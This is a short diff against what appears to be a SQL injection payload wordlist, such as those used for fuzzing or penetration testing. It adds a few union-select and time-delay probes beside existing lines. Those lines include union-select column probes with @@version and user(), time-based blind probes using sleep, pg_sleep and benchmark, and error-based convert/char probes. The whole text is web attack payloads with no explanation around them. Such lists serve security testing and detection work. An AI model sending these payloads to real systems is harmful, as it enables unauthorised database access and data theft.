@@ -1059,6 +1059,10 @@ order by sleep(5)
  union all select @@version,user(),sleep(5),benchmark(1000000,md5('a')),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null-- 
  union all select @@version,user(),sleep(5),benchmark(1000000,md5('a')),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null-- 
  union all select null-- 
+ union all select null, null --
+ sleep ( x )
+ pg_sleep  (  __TIME__  )
+ where x = x
  and 5650=convert(int,(union all selectchar(88)))-- 
  and 5650=convert(int,(union all selectchar(88)+char(88)))-- 
  and 5650=convert(int,(union all selectchar(88)+char(88)+char(88)))-- 
